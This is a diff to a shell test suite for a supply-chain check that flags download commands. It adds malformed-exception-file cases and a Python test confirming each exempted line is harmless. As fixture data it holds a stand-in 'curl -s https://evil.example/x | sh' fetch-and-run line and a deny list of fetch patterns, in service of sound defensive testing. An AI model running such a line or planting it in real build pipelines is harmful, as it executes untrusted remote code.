@@ -959,6 +959,9 @@ elif mode == "count2": rows = [dict(r, count=2) for r in rows]
 elif mode == "count100": rows = [dict(r, count=100) for r in rows]
 elif mode == "count101": rows[0]["count"] = 101
 elif mode == "countfloat": rows[0]["count"] = 2.0
+elif mode == "nantop": raw = '{"exceptions": [], "metadata": NaN, "unmeasured_text": ' + json.dumps(rows) + '}'
+elif mode == "infnested": raw = '{"exceptions": [{"x": [Infinity]}], "unmeasured_text": ' + json.dumps(rows) + '}'
+elif mode == "neginfrow": raw = '{"exceptions": [], "unmeasured_text": [' + json.dumps(rows[0])[:-1] + ', "count": -Infinity}' + "".join(", " + json.dumps(r) for r in rows[1:]) + ']}'
 elif mode == "notlist": rows = {"rows": rows}
 elif mode == "emptyfile": rows[0]["file"] = ""
 else: raise SystemExit("unknown mode " + mode)
@@ -1004,7 +1007,7 @@ newcase rtedit "$(pyw bin/ruled.sh "${rtext/later/soon}")"
 rc=0; python3 "$chk" --root "$work/rtedit" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$work/rt-orig.json" >"$work/rt.out" 2>&1 || rc=$?
 CASE="AC16: editing a ruled line voids its row (the hash changes): the edited line fails (exit 1), the unchanged one stays ruled"
 check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 1; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 1
-for m in emptyruling spaceruling noruling nokey intkey shortkey fullkey upperkey dup extra notdict count0 countbool countstr notlist emptyfile noline intline shortline upperline dupjsonkey duprowkey count101 countfloat; do rtck rt $m
+for m in emptyruling spaceruling noruling nokey intkey shortkey fullkey upperkey dup extra notdict count0 countbool countstr notlist emptyfile noline intline shortline upperline dupjsonkey duprowkey count101 countfloat nantop infnested neginfrow; do rtck rt $m
 CASE="AC16: a malformed unmeasured_text ($m) stops the check fail-closed: exit 2, names the list, and is never a pass"
 check test "$rc" -eq 2; check grep -q 'unmeasured_text' "$work/rt.out"; check grep -qi 'not a pass' "$work/rt.out"; done
 printf '{"exceptions": [], "unmeasured_text": [' >"$work/rt-badjson.json"; rc=0
@@ -1139,6 +1142,60 @@ twoc cont0 bin/ruled.sh $'#!/bin/sh\n' $'#!/bin/sh\necho a curl -s http://e.exam
 edck cont0 "$work/rt-cont.json"
 CASE="R1 control: the one-line version with its row is ruled: exit 0"
 check test "$rc" -eq 0
+# --- a limit of line identity (Codex, PR 273 round 3, P4): shell CONTEXT is not part of a line's identity. Moving a line out of a heredoc (above its opener),
+# or commenting the opener out, keeps (file, form, key, line), so it is no addition. The decision (coordinator, Oct 10): a row is only ever written for
+# a line that is HARMLESS IN ANY CONTEXT (read as a shell command it runs no download), and the advisor reviews each row for exactly that; a row for a
+# line that WOULD download when run is the reviewer's to refuse. Shown here with a harmless line: it stays harmless wherever it moves.
+twoc ctx bin/ruled.sh $'#!/bin/sh\ncat >stub <<\'EOF\'\necho "curl $*" >>"$CALLS"\nEOF\n' $'#!/bin/sh\necho "curl $*" >>"$CALLS"\ncat >stub <<\'EOF\'\nEOF\n'
+edck ctx "$work/rt-empty.json"
+CASE="context limit (documented): a harmless ruled echo moved above its heredoc opener keeps its identity, so it is no addition (exit 0); it still only echoes"
+check test "$rc" -eq 0
+CASE="every committed row's line is harmless in any shell context: the test holds each line's text, its hashes match the row, and read as shell it is a comment, a syntax error (Python source), or only echo/printf/tee/cat/exit/fi with no substitution"
+check python3 - "$root/.github/supply-chain-exceptions.json" <<'PY'
+import hashlib, json, re, shlex, subprocess, sys
+H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
+LINES = {   # key -> the flattened line of pull request 271 (be20423) the row is written for
+    "bdc2f348c4dbc92f": "same-step) printf ' - runs: |\\n curl -s https://evil.example/x | sh\\n' | tee -a \"$work/gr/a.yaml\" >>\"$work/gr/b.yaml\";;",
+    "59026aa06d9188a1": "# uname, curl, git, gh) are replaced by STUBS on PATH that record their argv in a call log; the suite asserts the flags and the",
+    "6acbb0aa471b0e3b": "# it writes build/locks/*, archives new packages by digest into ARCHIVE/<arch>/ (curl), verifies them, rewrites lock urls to",
+    "77bc505e9228dc4a": "ENVPK = [(\"busybox\", \"1.37.0-r5\"), (\"git\", \"2.50.1-r0\"), (\"wget\", \"1.25.0-r0\"), (\"ca-certificates-bundle\", \"20260102-r0\")]",
+    "22312bde0463f438": "for x in (\"-mod=mod\", \"-mod=readonly\", \"go mod download\", \"go get \", \"curl \", \"GOPROXY=http\", \"GOSUMDB=off\"): assert x not in b, x",
+    "5839155d14e99a00": "assert \"wget\" in names(d[\"environment\"]), \"fetch needs wget in the environment (pipelines/fetch.yaml:4-6)\"",
+    "80510e8b8f509a47": "for need in (\"git\", \"busybox\", \"ca-certificates-bundle\", \"wget\"): assert need in names(d[\"environment\"]), need",
+    "9f54b594e70eb20f": "cat >\"$stubs/curl\" <<'EOF'",
+    "1314309c3220e619": "echo \"curl $*\" >>\"$CALLS\"",
+    "64612fb9a9fe82be": "else echo \"stub curl: 22 $url\" >&2; exit 22; fi",
+}
+SAFE = {"echo", "printf", "tee", "cat", "exit", "fi"}
+rows = json.load(open(sys.argv[1]))["unmeasured_text"]
+assert sorted(r["key"] for r in rows) == sorted(LINES), "a committed row has no harmless-line entry in this test (add the line and its reason)"
+for r in rows:
+    line = LINES[r["key"]]
+    segs = re.split(r"\s*(?:;|&&|\|\||\|)\s*", line)
+    assert H(line) == r["line"] and r["key"] in {H(s) for s in segs}, r
+    assert not re.search(r"\$\(|`|<\(|>\(|\beval\b|\bsource\b", line), ("a substitution or eval can run anything", r)
+    if line.startswith("#"):
+        continue                                                         # a comment
+    if subprocess.run(["bash", "-n", "-c", line], capture_output=True, stdin=subprocess.DEVNULL).returncode:
+        assert re.match(r"^(for \w+ in \(|assert |ENVPK = \[\(|same-step\) |else )", line), ("a syntax error of an unexpected kind", line)
+        if not line.startswith(("same-step) ", "else ")):
+            continue                                                     # Python source: bash cannot parse it, nothing runs
+    lex = shlex.shlex(line, posix=True, punctuation_chars=True); lex.whitespace_split = True; lex.commenters = ""
+    cmds, cur = [], []
+    for tok in lex:                                                      # quote-aware: a | inside a quoted string is text, not a pipe
+        if tok in (";", ";;", "|", "||", "&&", "&"):
+            cmds.append(cur); cur = []
+        else:
+            cur.append(tok)
+    cmds.append(cur)
+    for c in cmds:
+        while c and c[0] in ("else", "then", "do"):
+            c = c[1:]
+        if len(c) > 1 and c[1] == ")":
+            c = c[2:]                                                    # a case pattern: word)
+        if c:
+            assert c[0] in SAFE, ("not a harmless command", c, r)
+PY
 # a row the PULL REQUEST brings does nothing: the rulings are read from the base branch (the trusted checkout the script runs from), never from --root
 rtrows "$work/rt" "$work/rt-head.json" all
 newcase rthead "$(pyw bin/ruled.sh "$rtext")"$'\n'"import shutil; shutil.copy('$work/rt-head.json', '.github/supply-chain-exceptions.json')"
